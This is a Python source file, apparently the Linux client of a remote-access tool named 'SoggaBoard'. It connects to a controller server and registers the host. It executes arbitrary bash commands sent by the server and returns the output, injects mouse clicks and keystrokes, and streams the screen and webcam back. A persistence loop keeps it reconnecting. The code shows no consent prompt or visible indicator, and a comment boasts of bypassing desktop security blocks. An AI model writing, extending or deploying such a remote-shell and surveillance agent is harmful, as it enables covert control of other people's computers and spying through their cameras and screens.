import os
import subprocess
import threading
import base64
import time
import socket
import platform
import socketio
import cv2
import numpy as np
import pyautogui

# --- SOGGABOARD CONFIG ---
# Update this to your Windows Server IP (e.g., http://192.168.1.10:8888)
SERVER_URL = "http://your_ip:your_server_port" 
sio = socketio.Client()

# State Management (Matches Windows logic for stability)
FLAGS = {"screen": False, "cam": False}

@sio.on('connect')
def on_connect():
    """Register with the Windows Server immediately."""
    sio.emit('register_client', {
        'name': f"{platform.node()} [Linux]",
        'ip': socket.gethostbyname(socket.gethostname())
    })
    print("[!] LINK ESTABLISHED: SoggaBoard Linux Handshake Complete.")

@sio.on('dispatch')
def on_dispatch(data):
    """Handles commands from the Windows Dashboard."""
    global FLAGS
    action = data.get('action')

    # 1. LINUX SHELL EXECUTION
    if action == 'shell':
        try:
            # Uses /bin/bash for full compatibility with Linux commands/pipes
            proc = subprocess.Popen(data['data'], shell=True, executable='/bin/bash', 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate(timeout=10)
            output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            sio.emit('shell_response', {'output': output if output else "Done (No Output)."})
        except Exception as e:
            sio.emit('shell_response', {'output': f"LINUX_ERR: {str(e)}"})

    # 2. CLICK & KEYBOARD (Works on X11)
    elif action == 'click':
        w, h = pyautogui.size()
        pyautogui.click(int(data['x'] * w), int(data['y'] * h))

    elif action == 'keypress':
        # Linux is more sensitive to case; we lowercase standard keys
        pyautogui.press(data['key'].lower())

    # 3. STREAMING ENGINE TOGGLES (Atomic State Logic)
    elif action == 'start_share':
        FLAGS["cam"] = False  # Explicit Kill of other feed
        time.sleep(0.1)
        if not FLAGS["screen"]:
            FLAGS["screen"] = True
            threading.Thread(target=screen_streamer, daemon=True).start()
    
    elif action == 'stop_share':
        FLAGS["screen"] = False
    
    elif action == 'start_webcam':
        FLAGS["screen"] = False # Explicit Kill of other feed
        time.sleep(0.1)
        if not FLAGS["cam"]:
            FLAGS["cam"] = True
            threading.Thread(target=cam_streamer, daemon=True).start()
            
    elif action == 'stop_webcam':
        FLAGS["cam"] = False

# --- LINUX OPTIMIZED STREAMERS ---

def screen_streamer():
    """Uses scrot for reliable Linux capture (bypasses Wayland/X11 security blocks)."""
    while FLAGS["screen"]:
        try:
            # Capture to temp file to ensure we get the full desktop render
            subprocess.run(["scrot", "-z", "/tmp/sogga_scr.png"], check=True)
            frame = cv2.imread("/tmp/sogga_scr.png")
            
            if frame is not None:
                # Add a red dot for the mouse cursor (since scrot doesn't always capture it)
                mx, my = pyautogui.position()
                cv2.circle(frame, (mx, my), 8, (0, 0, 255), -1)
                
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'screen'})
            
            os.remove("/tmp/sogga_scr.png") # Clean up cache
            time.sleep(0.05)
        except:
            break

def cam_streamer():
    """Accesses Linux V4L2 hardware."""
    cap = cv2.VideoCapture(0) # Standard Linux /dev/video0
    while FLAGS["cam"]:
        ret, frame = cap.read()
        if not ret: break
        
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
        sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'webcam'})
        time.sleep(0.06)
    cap.release()
    print("[!] Linux Camera Hardware Released.")

if __name__ == "__main__":
    # Persistence Loop: Auto-reconnect to Windows Server
    while True:
        try:
            if not sio.connected:
                sio.connect(SERVER_URL)
            sio.wait()
        except:
            time.sleep(5)
